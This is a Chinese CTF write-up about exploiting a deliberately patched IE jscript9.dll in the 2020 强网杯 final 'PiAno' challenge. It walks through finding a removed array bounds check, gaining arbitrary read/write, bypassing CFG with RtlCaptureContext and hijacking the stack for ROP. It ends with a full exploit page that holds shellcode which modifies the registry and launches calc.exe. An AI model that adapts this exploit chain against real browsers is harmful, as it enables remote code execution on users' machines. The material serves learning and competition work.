# 强网杯2020决赛RealWord的IE浏览器漏洞挖掘——PiAno(PA)

阅读量 **221709**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-11-23 14:30:41

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 0x00前言

最近在学浏览器方面的漏洞挖掘，就从强网杯的这道PiAno(PA)来分享一下我个人的收获与总结

**题目信息：**

**题目名称：** PiAno

**旗帜名称：** PA

**题目描述：**
附件中提供了一个Win10虚拟机，虚拟机中存在一个patch过jscript9.dll的IE浏览器，挖掘并利用程序漏洞，实现任意代码执行，在靶机中弹出计算器程序。

**靶机环境：** Win10 虚拟机。

**附件信息：** Win10 虚拟机（与靶机一致）。

**展示环境拓扑：** 交换机连接选手攻击机和展示机，展示机使用VMware（最新版）运行靶机，靶机通过NAT方式连接到网络。

验证过程：选手携带自己的攻击机上台展示题解，操作人员使用虚拟机中的IE浏览器访问选手的提供的页面。在规定的时间内，在靶机中弹出计算器程序判定为题解正确。

**注意事项：** 上台展示题解的时候注意关闭exp的调试信息。

## 0x01 挖掘过程

###  找到patch点

从题目描述得知，被patch的文件是IE浏览器的jscript9.dll这个动态库，该库是IE浏览器的JS引擎，因此可以知道漏洞点出在JS上，并且靠JS来实现利用。IE浏览器分32位和64位，我们需要先确定是哪个版本的jscript9.dll被patch了，首先进入题目的虚拟机，查看64位下的jscript9.dll文件的版本，发现版本为11.0.19041.508，正好我本机的IE浏览器的jscript9.dll文件也是这个版本

![](https://p4.ssl.qhimg.com/t01fac10699c046efd7.png)

通过Fairdell
HexCmp2文件差异对比，发现64位jscript9.dll没有被patch，32位的jscript9.dll被patch了，差异点如下

    
    
    Different between:
    First file: "C:\Users\Administrator\Desktop\realword\jscript9.dll"
    Second file: "C:\Users\Administrator\Desktop\realword\jscript9_after.dll"
    Shift: 0
    ------------------------------------------------------------------------    
    First file: "C:\Users\Administrator\Desktop\realword\jscript9.dll"
    Second file: "C:\Users\Administrator\Desktop\realword\jscript9_after.dll"
    Shift: 0
    Shift: 0
    ------------------------------------------------------------------------    
    000DFE00 |                0F 83 C9 | 000DFE00 |                90 90 90 |
    000DFE08 | 00 00 00                | 000DFE08 | 90 90 90                |
    000DFE10 |    3F                   | 000DFE10 |    06                   |
    000DFE18 |                      72 | 000DFE18 |                      EB |
    ------------------------------------------------------------------------    000DFE88 |          E8 EB 69 04 00 | 000DFE88 |          90 90 90 90 90 |
    ------------------------------------------------------------------------    

###  分析patch点

微软为开发者提供了自家产品的符号文件，我们可以用32位的windbg目录下的symchk程序单独下载dll的符号，得到一个pdb文件

    
    
    symchk.exe jscript9.dll /s SRV*c:\symbols\*http://msdl.microsoft.com/download/symbols
    

我们将jscript9.dll以及jscript9_patched.dll用IDA分析，然后将符号文件导入IDA后，跳转到差异处进行分析，该patch位于Js::JavascriptNativeIntArray::SetItem函数中，可以知道该漏洞与Js::JavascriptNativeIntArray有关，也就是js里的整数型数组有问题。

![](https://p4.ssl.qhimg.com/t01cb2f16d9cd496aac.png)

发现有些指令直接被nop了，查看伪代码

![](https://p2.ssl.qhimg.com/t018c208a44fc32d5ff.png)

再查看一下未patch前的代码

![](https://p5.ssl.qhimg.com/t01d75c5f72393d0489.png)

对比可以发现，在setItem操作中，patch掉了对数组下标的大小进行正向越界检查，index为无符号数,通过`index -*v7`计算数组的下标，然后`v7[v8+4] = v6`可以越界写int数据

![](https://p2.ssl.qhimg.com/t01a5a004f48792d8de.png)

###  实现任意地址读写

通过上面的分析可以知道，在这个js引擎中，整数数组已经具有了任意地址`写`的能力，但是还不具有任意地址`读`的能力。为此，我们先利用任意地址写的能力，修改intarray自身的头部的几个用于表示该数组长度范围的成员变量为-1，从而使得该intarray具有任意地址读的能力。IE9之后使用的是Chakra引擎，从代码仓库可以找到该引擎的源码，从而可以得到JavascriptNativeIntArray的结构，由于源码过于复杂，不容易分析出其成员变量的分布，因此我们直接用windbg进行动态调试，确定需要修改的相关变量的位置。

首先写上测试用的html页面，启动32位IE浏览器，打开这个页面，当弹出对话框时，使用windbg attach到进程上

    
    
    <!DOCTYPE html>
    <html>
      <body>
        <script>
          var vuln = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];
          alert("ready to go!");
          vuln[0x66] = 1;
        </script>
      </body>
    </html>
    

接下来利用`bp jscript9.dll基址+0xE09FA`在此处设置断点后继续运行

![](https://p5.ssl.qhimg.com/t016ba7992fbfa2905f.png)

断点断下来后，可以看到ecx正是我们的数组下标·`0x66`，并且`edi+0x10`处正是intarray对象的数组数据区起始位置

![](https://p2.ssl.qhimg.com/t0196b07d61e385217f.png)

查看其前方的数据，可以发现有几个数据与我们的数组长度相当,我们将其全部改为`0xFFFFFFFF`以后发现该对象就能够进行任意地址读了。

![](https://p3.ssl.qhimg.com/t01b3d0326317af33e4.png)

    
    
          //修改自身的size，实现任意地址读写
          vuln[0x3ffffffe] = -1;
          vuln[0x3ffffffd] = -1;
          vuln[0x3ffffff6] = -1;
    

具有任意地址读写以后，就是常规的利用了。

###  泄露地址

我们也看到，数据区前方就有jscript9.dll里的指针，进一步分析还可以知道这是一个虚表地址。

![](https://p5.ssl.qhimg.com/t015dc7e473981b1114.png)

因此直接越界读，泄露虚表地址得到jscript9.dll的地址，进而得到其他函数的地址

    
    
          //泄露vtable地址
          var vtable_addr = vuln[0x3ffffff2];
          var jscript9_base = vtable_addr - 0x37e8;
          var LoadLibraryExA_ptr = jscript9_base + 0x37600C;
          var GetProcAddress_ptr = jscript9_base + 0x3761A8;
          var VirtualProtect_ptr = jscript9_base + 0x376110;
          var RtlCaptureContext_ptr = jscript9_base + 0x376488;
          var pop_esp = jscript9_base + 0x774ff;
          var mov_esp_ebx = jscript9_base + 0x23721a;
          var add_esp = jscript9_base + 0x270d5c;
          var base = vuln[0x3ffffff8] + 0x10;
          //alert("jscript9_base="+jscript9_base.toString(16));
          //alert("base="+base.toString(16));
          //4字节地址对齐的任意地址读
          function arb_read(addr) {
             var offset = addr - base;
             if (offset < 0) {
                offset = (0x100000000 + offset) / 4;
             } else {
                offset = offset / 4;
             }
             return vuln[offset];
          }
          function packInt(value) {
             if (value > 0x80000000) {
                value = value - 0x100000000;
             }
             return value;
          }
    
          var LoadLibraryExA_addr = arb_read(LoadLibraryExA_ptr);
          var GetProcAddress_addr = arb_read(GetProcAddress_ptr);
          var VirtualProtect_addr = arb_read(VirtualProtect_ptr);
          var RtlCaptureContext_addr = arb_read(RtlCaptureContext_ptr);
    

现在就是劫持程序流了，该模块开启了CFG机制，因此不能将虚表里的函数劫持为gadgets，只能劫持为一个完整的函数。

###  CFG绕过

绕过的方法是先将虚表里的函数劫持为某些对我们利用有帮助的函数，然后进行后续的其他方法利用。

`RtlCaptureContext`是一个非常有用的函数，其位于ntdll.dll模块里，这里我们已经通过IAT表泄露出了它的地址，该函数可以`将当前的所有寄存器值保存到参数给定的内存空间里`

    
    
    .text:4B307260                 public RtlCaptureContext
    .text:4B307260 RtlCaptureContext proc near             ; CODE XREF: sub_4B2F38E6+A↑p
    .text:4B307260                                         ; RtlRaiseException+B↓p ...
    .text:4B307260
    .text:4B307260 var_4           = dword ptr -4
    .text:4B307260 ContextRecord   = dword ptr  4
    .text:4B307260
    .text:4B307260                 push    ebx
    .text:4B307261                 mov     ebx, [esp+4+ContextRecord]
    .text:4B307265                 mov     [ebx+0B0h], eax
    .text:4B30726B                 mov     [ebx+0ACh], ecx
    .text:4B307271                 mov     [ebx+0A8h], edx
    .text:4B307277                 mov     eax, [esp+4+var_4]
    .text:4B30727A                 mov     [ebx+0A4h], eax
    .text:4B307280                 mov     [ebx+0A0h], esi
    .text:4B307286                 mov     [ebx+9Ch], edi
    .text:4B30728C                 jmp     short loc_4B3072D1
    .text:4B30728C RtlCaptureContext endp
    
    .text:4B3072D1 loc_4B3072D1:                           ; CODE XREF: RtlCaptureContext+2C↑j
    .text:4B3072D1                 mov     word ptr [ebx+0BCh], cs
    .text:4B3072D7                 mov     word ptr [ebx+98h], ds
    .text:4B3072DD                 mov     word ptr [ebx+94h], es
    .text:4B3072E3                 mov     word ptr [ebx+90h], fs
    .text:4B3072E9                 mov     word ptr [ebx+8Ch], gs
    .text:4B3072EF                 mov     word ptr [ebx+0C8h], ss
    .text:4B3072F5                 pushf
    .text:4B3072F6                 pop     dword ptr [ebx+0C0h]
    .text:4B3072FC                 mov     eax, [ebp+4]
    .text:4B3072FF                 mov     [ebx+0B8h], eax
    .text:4B307305                 mov     eax, [ebp+0]
    .text:4B307308                 mov     [ebx+0B4h], eax
    .text:4B30730E                 lea     eax, [ebp+8]
    .text:4B307311                 mov     [ebx+0C4h], eax
    .text:4B307317                 mov     dword ptr [ebx], 10007h
    .text:4B30731D                 pop     ebx
    .text:4B30731E                 retn    4
    

利用这一点，我们可以读出栈地址，然后可以利用任意地址读写的能力去劫持栈。

通过观察，发现劫持虚表里的hasItem函数比较可靠，因为只有一个参数，正好可以给我们用于传递地址参数，由于虚表是只读的，因此我们直接伪造一个虚表，在对应位置伪造hasItem函数指针

![](https://p2.ssl.qhimg.com/t018be716077fd46c72.png)

    
    
          //伪造该对象的虚表，从而leak出寄存器地址
          var leak = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];
          leak[0x3ffffffe] = -1;
          leak[0x3ffffffd] = -1;
          leak[0x3ffffff6] = -1;
          var fake_vtable_addr = leak[0x3ffffff8] + 0x10;
          leak[31] = packInt(RtlCaptureContext_addr); //伪造hasItem函数指针
          //修改leak的虚表指针
          leak[0x3ffffff2] = fake_vtable_addr;
    

要触发hasItem的调用，只需要利用数组对象的in语句

    
    
          //调用hasItem，结果存放于base地址处
          var x = (base in leak);
          var stack_addr = arb_read(base + 0xB4);
    

###  劫持栈做ROP

由于是数组对象的任意地址读写，我们如果直接用下标的方式去写，每次只能写4个字节数据，而劫持栈是需要一次性将ROP全部写到栈里去的，于是，我们发现了另一个函数`Js::JavascriptArray::EntryPush`，该函数会循环的将参数里的数组数据依次push到当前被调用的数组对象里

![](https://p5.ssl.qhimg.com/t01c90db7c074ad1001.png)

因此，我们可以劫持Js::JavascriptArray::EntryPush的栈返回地址，当循环执行完成时，ROP需要的数据都已写到栈里，当Js::JavascriptArray::EntryPush执行ret时便能执行ROP链。

###  完整利用exp.html

    
    
    <!DOCTYPE html>
    <html>
      <body>
        <script>
          var vuln = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];
          //修改自身的size，实现任意地址读写
          vuln[0x3ffffffe] = -1;
          vuln[0x3ffffffd] = -1;
          vuln[0x3ffffff6] = -1;
          //泄露vtable地址
          var vtable_addr = vuln[0x3ffffff2];
          var jscript9_base = vtable_addr - 0x37e8;
          var LoadLibraryExA_ptr = jscript9_base + 0x37600C;
          var GetProcAddress_ptr = jscript9_base + 0x3761A8;
          var VirtualProtect_ptr = jscript9_base + 0x376110;
          var RtlCaptureContext_ptr = jscript9_base + 0x376488;
          var pop_esp = jscript9_base + 0x774ff;
          var mov_esp_ebx = jscript9_base + 0x23721a;
          var add_esp = jscript9_base + 0x270d5c;
          var base = vuln[0x3ffffff8] + 0x10;
          //alert("jscript9_base="+jscript9_base.toString(16));
          //alert("base="+base.toString(16));
          //4字节地址对齐的任意地址读
          function arb_read(addr) {
             var offset = addr - base;
             if (offset < 0) {
                offset = (0x100000000 + offset) / 4;
             } else {
                offset = offset / 4;
             }
             return vuln[offset];
          }
          function packInt(value) {
             if (value > 0x80000000) {
                value = value - 0x100000000;
             }
             return value;
          }
    
          var LoadLibraryExA_addr = arb_read(LoadLibraryExA_ptr);
          var GetProcAddress_addr = arb_read(GetProcAddress_ptr);
          var VirtualProtect_addr = arb_read(VirtualProtect_ptr);
          var RtlCaptureContext_addr = arb_read(RtlCaptureContext_ptr);
          //alert("LoadLibraryExA_addr="+LoadLibraryExA_addr.toString(16));
          //alert("GetProcAddress_addr="+GetProcAddress_addr.toString(16));
          //alert("VirtualProtect_addr="+VirtualProtect_addr.toString(16));
          //alert("RtlCaptureContext_addr="+RtlCaptureContext_addr.toString(16));
          //伪造该对象的虚表，从而leak出寄存器地址
          var leak = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];
          leak[0x3ffffffe] = -1;
          leak[0x3ffffffd] = -1;
          leak[0x3ffffff6] = -1;
          var fake_vtable_addr = leak[0x3ffffff8] + 0x10;
          leak[31] = packInt(RtlCaptureContext_addr); //伪造hasItem函数指针
          //修改leak的虚表指针
          leak[0x3ffffff2] = fake_vtable_addr;
          //调用hasItem，结果存放于base地址处
          var x = (base in leak);
          var stack_addr = arb_read(base + 0xB4);
          //劫持JavascriptArray::EntryPush函数的返回地址
          var rop_addr = stack_addr - 0x190;
    
          vuln[0] = 0x54464F53;
          vuln[1] = 0x45524157;
          vuln[2] = 0x63694D5C;
          vuln[3] = 0x6F736F72;
          vuln[4] = 0x575C7466;
          vuln[5] = 0x6F646E69;
          vuln[6] = 0x435C7377;
          vuln[7] = 0x65727275;
          vuln[8] = 0x6556746E;
          vuln[9] = 0x6F697372;
          vuln[10] = 0x6E495C6E;
          vuln[11] = 0x6E726574;
          vuln[12] = 0x53207465;
          vuln[13] = 0x69747465;
          vuln[14] = 0x5C73676E;
          vuln[15] = 0x656E6F5A;
          vuln[16] = 0x335C73;
          /*ADVAPI32.dll字符串*/
          vuln[17] = 0x41564441;
          vuln[18] = 0x32334950;
          vuln[19] = 0x6C6C642E;
          vuln[20] = 0;
    
          var buff = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];
          /*ucrtbase.dll字符串*/
          buff[0] = 0x74726375;
          buff[1] = 0x65736162;
          buff[2] = 0x6C6C642E;
          buff[3] = 0;
          /*RegOpenKeyExA字符串*/
          buff[4] = 0x4F676552;
          buff[5] = 0x4B6E6570;
          buff[6] = 0x78457965;
          buff[7] = 0x41;
          /*RegSetValueExA字符串*/
          buff[8] = 0x53676552;
          buff[9] = 0x61567465;
          buff[10] = 0x4565756C;
          buff[11] = 0x4178;
          /*RegCloseKey字符串*/
          buff[12] = 0x43676552;
          buff[13] = 0x65736F6C;
          buff[14] = 0x79654B;
          /*system字符串*/
          buff[15] = 0x74737973;
          buff[16] = 0x6D65;
    
          /*calc.exe字符串*/
          buff[17] = 0x636C6163;
          buff[18] = 0x6578652E;
          buff[19] = 0;
    
    
          buff[0x3ffffffe] = -1;
          buff[0x3ffffffd] = -1;
          buff[0x3ffffff6] = -1;
          var strs_base = buff[0x3ffffff8] + 0x10;
    
          //修改vuln的index，然后利用push可以一次性写入多个值
          vuln[0x3ffffff6] = (rop_addr - base) / 4;
          vuln[0x3ffffffd] = (rop_addr - base) / 4;
          alert("rop_addr="+rop_addr.toString("16"));
    
          vuln.push(packInt(VirtualProtect_addr),packInt(rop_addr+0x18),packInt(rop_addr+0x18),0x300,0x40,packInt(rop_addr),packInt(0x81e58955),0x100ec,packInt(0xfc45c700),0x3,packInt(0xff5085c7),0x3532ffff,packInt(0x85c73030),packInt(0xffffff54),0x0,0x80068,0x68006a00,packInt(base+0x44),packInt(0x85c79090),packInt(0xffffff4c),packInt(LoadLibraryExA_addr),packInt(0xff4c95ff),packInt(0x8589ffff),packInt(0xffffff48),0x68909090,packInt(strs_base+0x10),packInt(0x85c79050),packInt(0xffffff44),packInt(GetProcAddress_addr),packInt(0xff4495ff),packInt(0x8589ffff),packInt(0xffffff40),0x68909090,packInt(strs_base+0x20),packInt(0xff48b5ff),packInt(0x95ffffff),packInt(0xffffff44),packInt(0xff3c8589),0x6890ffff,packInt(strs_base+0x30),packInt(0xff48b5ff),packInt(0x95ffffff),packInt(0xffffff44),packInt(0xff388589),packInt(0x858dffff),packInt(0xffffff34),0x66850,0x6a0002,0x68909090,packInt(base),0x168,0x4095ff80,0x6affffff,packInt(0xfc458d04),0x6a046a50,0x50858d00,0x50ffffff,packInt(0xff34b5ff),packInt(0x95ffffff),packInt(0xffffff3c),packInt(0xff34b5ff),packInt(0x95ffffff),packInt(0xffffff38),0x80068,0x68006a00,packInt(strs_base),packInt(0xff4c95ff),0x6890ffff,packInt(strs_base+0x3C),0x4495ff50,0x68ffffff,packInt(strs_base+0x44),0xD0FF);
          //alert("done");
        </script>
      </body>
    </html>
    

## 0x02 测试

测试时需要关闭IE浏览器的保护模式，否则会由于IE浏览器的沙盒机制，系统函数调用失败

![](https://p5.ssl.qhimg.com/t0189043b7c25f844fb.png)

## 0x03 感想

通过本题学习了IE浏览器漏洞挖掘的一些利用手法，收获很大，RealWord还是比普通PWN有趣。

## 0x04 参考

1.如何绕过Windows 10的CFG机制<https://www.freebuf.com/articles/system/126007.html>

2.CFG防护机制的简要分析 <https://xz.aliyun.com/t/2587>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ha1vk@赛宁网安天虞实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/222678](/post/id/222678)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [二进制](/tag/二进制)
  * [浏览器逃逸](/tag/浏览器逃逸)

 **+1** __20赞

 __收藏

![](https://p5.ssl.qhimg.com/t015704b4b2e374eb33.jpg) ha1vk@赛宁网安天虞实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

